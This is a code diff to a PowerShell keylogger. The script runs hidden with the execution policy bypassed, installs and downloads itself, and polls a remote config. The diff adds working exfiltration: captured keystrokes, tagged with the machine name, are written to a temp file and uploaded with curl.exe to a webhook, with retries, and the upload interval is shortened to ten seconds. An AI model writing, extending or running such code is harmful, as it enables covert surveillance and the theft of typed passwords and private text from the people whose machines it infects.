@@ -23,10 +23,15 @@ $trS  = "powershell -w hidden -ep bypass -f `"$shut`""
 New-Item -ItemType Directory $dir -Force | Out-Null
 if ($PSCommandPath -and $PSCommandPath -ne $self) { Copy-Item $PSCommandPath $self -Force }
 if (-not (Test-Path $self)) { curl.exe -s -o $self $boot }
-if (-not (Test-Path $posF)) { Set-Content $posF "0" }
 if (-not (Test-Path $log))  { Set-Content $log "" }
 Add-Content $run "start $(Get-Date -f s)"
-$pos = [int](Get-Content $posF)
+
+$pos = 0
+if (Test-Path $posF) { $pos = [int](Get-Content $posF) }
+$len0 = 0
+if (Test-Path $log) { $len0 = (Get-Content $log -Raw).Length }
+if (-not $len0) { $len0 = 0 }
+if ($pos -gt $len0) { $pos = $len0 }
 
 function Send($t) {
   if (-not $t) { return }
@@ -60,8 +65,20 @@ if (-not $Test -and -not $Debug) {
 function Flush {
   if (-not (Test-Path $log)) { return }
   $a = Get-Content $log -Raw
-  if (-not $a -or $a.Length -le $pos) { return }
-  Send "[k] " + $a.Substring($pos)
+  if (-not $a) { return }
+  if ($pos -gt $a.Length) { $pos = 0 }
+  if ($a.Length -le $pos) { return }
+
+  $d = $a.Substring($pos)
+  $f = "$env:TEMP\k_$(Get-Date -f HHmmss).txt"
+  $d | Set-Content $f -Encoding UTF8
+  for ($r = 1; $r -le 3; $r++) {
+    curl.exe -s -f -F "content=**keylog** $env:COMPUTERNAME" -F "files[0]=@$f" $hook | Out-Null
+    if ($LASTEXITCODE -eq 0) { break }
+    Start-Sleep -Seconds 2
+  }
+  Remove-Item $f -ErrorAction SilentlyContinue
+
   $pos = $a.Length
   if ($a.Length -gt 200000) {
     $a = $a.Substring($a.Length - 100000)
@@ -99,8 +116,15 @@ while ($true) {
 
       $cfg = @{}
       foreach ($l in ($c -split "`n")) {
-        if ($l -match '^\s*#') { continue }
-        if ($l -match '^\s*([a-z_]+)\s*=\s*(.*?)\s*$') { $cfg[$matches[1]] = $matches[2] }
+        $l = $l.Trim()
+        if (-not $l) { continue }
+        if ($l.StartsWith("#")) { continue }
+        $i = $l.IndexOf("=")
+        if ($i -lt 1) { continue }
+        $k = $l.Substring(0, $i).Trim().ToLower()
+        $v = $l.Substring($i + 1).Trim()
+        if ($v.StartsWith("$k=")) { $v = $v.Substring($k.Length + 1).Trim() }
+        $cfg[$k] = $v
       }
       function Flag($n) { $cfg[$n] -eq "1" }
 
@@ -174,5 +198,5 @@ while ($true) {
   } else { Start-Sleep -Milliseconds 800 }
 
   if (((Get-Date) - $tRun).TotalSeconds -gt 30) { Add-Content $run "alive $(Get-Date -f s)"; $tRun = Get-Date }
-  if ($logOn -and ((Get-Date) - $tUlt).TotalSeconds -gt 20) { Flush; $tUlt = Get-Date }
+  if ($logOn -and ((Get-Date) - $tUlt).TotalSeconds -gt 10) { Flush; $tUlt = Get-Date }
 }
